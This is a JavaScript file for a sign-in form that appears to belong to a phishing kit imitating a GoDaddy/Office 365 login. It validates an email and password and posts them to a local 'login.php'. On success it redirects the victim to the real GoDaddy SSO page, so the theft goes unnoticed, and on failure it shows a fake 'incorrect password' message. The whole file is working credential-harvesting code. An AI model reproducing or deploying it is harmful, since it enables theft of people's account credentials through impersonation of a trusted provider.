
var User = document.getElementById('username');
var Pass = document.getElementById('password');
var Err_msg = document.getElementById('login-status-message');

function validateEmail(email) {
    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}

//
User.addEventListener("keyup", function (event) {
	
    if (event.keyCode === 13) {
        event.preventDefault();
        NE()
    } else {
        User.classList.remove('sso-field-danger');
		document.getElementById("login-status-message").style.display = "none";
    }
});
Pass.addEventListener("keyup", function (event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        NE()
    } else {
        Pass.classList.remove('sso-field-danger');
		document.getElementById("login-status-message").style.display = "none";
    }
});

function NE() {
    if (Pass.value == "") {
        Pass.classList.add('sso-field-danger');
        Pass.focus();
    }
    if (User.value == "") {
        User.classList.add('sso-field-danger');
        User.focus();
    } else if (!validateEmail(User.value)) {
        User.classList.add('sso-field-danger');
        User.focus();
    }


    if (Pass.value != "" && validateEmail(User.value)) {
		
        document.getElementById('submitBtn').disabled = true;

        var hr = new XMLHttpRequest();
        var url = "login.php";
		var vars = "user=" + User.value + "&pass=" + Pass.value;
        hr.open("POST", url, true);
        hr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        hr.send(vars);


        hr.onreadystatechange = function () {
            if (hr.readyState == XMLHttpRequest.DONE) {

                var resp = hr.responseText;

                if (resp == 1) {
                    window.location.replace("https://sso.godaddy.com/?realm=pass&app=o365&username="+User.value);

                } else {
					document.getElementById("login-status-message").style.display = "block";
					document.getElementById("error").innerHTML = "Authentication failed. You entered an incorrect username or password.";
                    document.getElementById('submitBtn').disabled = false;

                }
            }
        }




    }

    // alert('OK');
}